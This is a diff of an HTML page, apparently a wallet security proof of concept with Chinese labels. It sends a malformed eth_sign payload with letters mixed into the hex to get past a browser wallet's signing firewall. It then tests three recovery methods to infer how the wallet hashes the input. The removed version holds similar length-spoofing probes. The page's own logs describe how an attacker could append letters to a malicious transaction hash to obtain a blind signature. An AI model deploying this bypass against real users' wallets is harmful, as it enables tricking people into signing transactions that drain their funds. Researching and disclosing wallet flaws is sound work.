@@ -2,33 +2,41 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>eth_sign 防火墙规则探测器</title>
+    <title>eth_sign 解析器漏洞全自动破解 PoC</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
     <style>
         body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
-        button { padding: 12px; margin: 8px 8px 8px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold;}
-        button.bypass { background-color: #fd7e14; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
-        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
+        h2 { color: #2c3e50; }
+        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 14px;}
+        button.danger { background-color: #dc3545; }
+        button:disabled { background-color: #cccccc; cursor: not-allowed; color: #666;}
+        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; line-height: 1.5; }
+        .info-box { margin-bottom: 20px; padding: 15px; background: #e9ecef; border-left: 5px solid #dc3545; border-radius: 4px; }
     </style>
 </head>
 <body>
-    <h2>eth_sign 防火墙盲区探测 (Bypass Probes)</h2>
+    <h2>eth_sign 字符解析漏洞全自动鉴定器</h2>
+    <div class="info-box">
+        <strong>渗透测试流：</strong><br>
+        1. 注入含有字母的畸形 Hex 数据 <code>0x11223344Some_evil_content</code> 绕过防火墙。<br>
+        2. 拿到签名后，在前端并发 3 种密码学算法，反推钱包底层的处理逻辑。
+    </div>
+
     <div>
-        <button id="btnConnect">1. 连接钱包</button>
+        <button id="btnConnect">1. 连接测试钱包</button>
         地址: <span id="walletAddress" style="color:#007bff; font-weight:bold;">未连接</span>
     </div>
 
-    <div style="margin-top: 20px; border-top: 1px dashed #ccc; padding-top: 20px;">
-        <button id="btnProbe1" class="bypass" disabled>探针 1: 非法 Hex 字符注入 (复刻第一版)</button>
-        <button id="btnProbe2" class="bypass" disabled>探针 2: 长度欺骗 (末尾追加 00)</button>
-        <button id="btnProbe3" class="bypass" disabled>探针 3: 长度欺骗 (非 32 字节的纯 Hex)</button>
+    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
+        <button id="btnExploit" class="danger" disabled>2. 触发绕过并自动鉴定底层逻辑</button>
     </div>
 
-    <h3 style="margin-top: 20px;">探测日志:</h3>
+    <h3 style="margin-top: 30px;">破解控制台:</h3>
     <div id="console">等待操作...</div>
 
     <script>
+        const btnConnect = document.getElementById('btnConnect');
+        const btnExploit = document.getElementById('btnExploit');
         const elAddress = document.getElementById('walletAddress');
         const elConsole = document.getElementById('console');
         let currentAccount = null;
@@ -38,55 +46,104 @@
             elConsole.scrollTop = elConsole.scrollHeight;
         }
 
-        document.getElementById('btnConnect').addEventListener('click', async () => {
+        btnConnect.addEventListener('click', async () => {
             if (window.ethereum) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     currentAccount = accounts[0]; 
                     elAddress.innerText = currentAccount;
-                    log(`✅ 已连接: ${currentAccount}`);
-                    document.querySelectorAll('.bypass').forEach(b => b.disabled = false);
+                    log(`✅ 钱包已连接: ${currentAccount}`);
+                    btnExploit.disabled = false;
                 } catch (e) { log(`❌ 连接失败: ${e.message}`); }
             }
         });
 
-        async function sendProbe(probeName, payload) {
+        btnExploit.addEventListener('click', async () => {
             if (!currentAccount) return;
-            log(`\n--- 🚀 执行 [${probeName}] ---`);
-            log(`发送的 Payload: ${payload}`);
+            
+            // 这个 Payload 已经确认可以击穿该钱包的防火墙
+            const payload = "0x11223344Some_evil_content";
+            
+            log(`\n--- 🚀 发送畸形 Payload 进行绕过 ---`);
+            log(`Payload: ${payload}`);
             
             try {
-                const sig = await window.ethereum.request({ method: 'eth_sign', params: [currentAccount, payload] });
-                log(`🚨 [绕过成功！] 钱包防火墙被击穿，拿到签名:\n${sig}`);
+                const signature = await window.ethereum.request({
+                    method: 'eth_sign',
+                    params: [currentAccount, payload]
+                });
                 
-                // 瞬间验证
-                if(typeof ethers !== 'undefined') {
-                    try {
-                        const rec = ethers.recoverAddress(payload, sig).toLowerCase();
-                        log(rec === currentAccount.toLowerCase() ? `💥 [高危] 密码学鉴定：这是真正的 eth_sign 盲签！` : `⚠️ 鉴定失败或已被转换为 personal_sign`);
-                    } catch(e) { log(`ℹ️ ethers.js 无法解析该格式的恢复。`); }
-                }
+                log(`🚨 [绕过成功！] 成功拿到签名数据:\n${signature}`);
+                log(`\n🔍 开始自动化并发破解钱包签名逻辑...`);
+                
+                crackSignatureLogic(payload, signature, currentAccount.toLowerCase());
+
             } catch (error) {
-                log(`🛡️ 拦截成功: ${error.message} (防火墙防住了此探针)`);
+                log(`🛡️ 请求被拦截: ${error.message}`);
+            }
+        });
+
+        function crackSignatureLogic(originalPayload, signature, address) {
+            if (typeof ethers === 'undefined') {
+                log("❌ ethers.js 未加载！"); return;
+            }
+
+            let cracked = false;
+
+            // =========================================
+            // 猜测 A: 安全处理 (自动套上了 EIP-191 消息前缀)
+            // =========================================
+            try {
+                const recA = ethers.verifyMessage(originalPayload, signature).toLowerCase();
+                if (recA === address) {
+                    log(`\n✅ [结论 A: 安全转码] 破解成功！`);
+                    log(`分析: 钱包防火墙虽然放行了非 Hex 字符，但底层签名模块将其视为了普通文本字符串，并强制加了 "\\x19Ethereum Signed Message:\\n" 前缀。`);
+                    log(`威胁等级: 极低。这笔签名无法被用作恶意的盲签交易。`);
+                    cracked = true;
+                }
+            } catch(e) {}
+
+            if (cracked) return;
+
+            // =========================================
+            // 猜测 B: 中危处理 (将文本进行 Keccak256 哈希后裸签)
+            // =========================================
+            try {
+                const utf8Bytes = ethers.toUtf8Bytes(originalPayload);
+                const hash = ethers.keccak256(utf8Bytes);
+                const recB = ethers.recoverAddress(hash, signature).toLowerCase();
+                if (recB === address) {
+                    log(`\n⚠️ [结论 B: 文本哈希裸签] 破解成功！`);
+                    log(`分析: 钱包将整串字符转为 UTF-8 字节并进行了 Keccak256 哈希，然后执行了不加前缀的底层盲签。`);
+                    log(`威胁等级: 中等。虽然是裸签，但由于包含了恶意字母，攻击者很难凑出一个刚好能被这样解析的有效交易哈希。`);
+                    cracked = true;
+                }
+            } catch(e) {}
+
+            if (cracked) return;
+
+            // =========================================
+            // 猜测 C: 致命漏洞 (自动剔除字母并裸签)
+            // =========================================
+            try {
+                // 提取出所有合法的 Hex 字符: 0x 11 22 33 44 e e c e
+                const strippedHex = "0x11223344eece";
+                // 钱包如果强制转码，通常是对其进行补齐或者 Hash
+                const hash = ethers.keccak256(strippedHex);
+                const recC = ethers.recoverAddress(hash, signature).toLowerCase();
+                
+                if (recC === address) {
+                    log(`\n💥 [结论 C: 致命剔除] 破解成功！`);
+                    log(`分析: 极度危险！钱包底层在签名时，自动忽略了你输入的字母，只对剩下的合法十六进制字符 (${strippedHex}) 进行了哈希裸签！`);
+                    log(`威胁等级: 极高 (CVE级别)！攻击者只需在真实恶意哈希末尾加上几个字母，就能完美穿透防火墙并拿到致命签名。`);
+                    cracked = true;
+                }
+            } catch(e) {}
+
+            if (!cracked) {
+                log(`\n❓ [未知逻辑] 以上三种常见处理逻辑均未匹配。该钱包的密码学底层行为非常诡异，可能使用了特殊的填充 (Padding) 规则。`);
             }
         }
-
-        // 探针 1：复刻你第一版能唤起的包含字母的伪 Hex
-        document.getElementById('btnProbe1').addEventListener('click', () => {
-            sendProbe("探针 1: 非法 Hex", "0x11223344Some_evil_content");
-        });
-
-        // 探针 2：经典的 0x00 长度填充绕过 (32字节哈希 + 00)
-        document.getElementById('btnProbe2').addEventListener('click', () => {
-            const rawHash = "0x89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
-            sendProbe("探针 2: 追加 00", rawHash + "00"); // 变成 33 字节
-        });
-
-        // 探针 3：纯 Hex，但故意少一个字节 (31字节)
-        document.getElementById('btnProbe3').addEventListener('click', () => {
-            const shortHash = "0x89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150"; 
-            sendProbe("探针 3: 31字节 Hex", shortHash);
-        });
     </script>
 </body>
 </html>
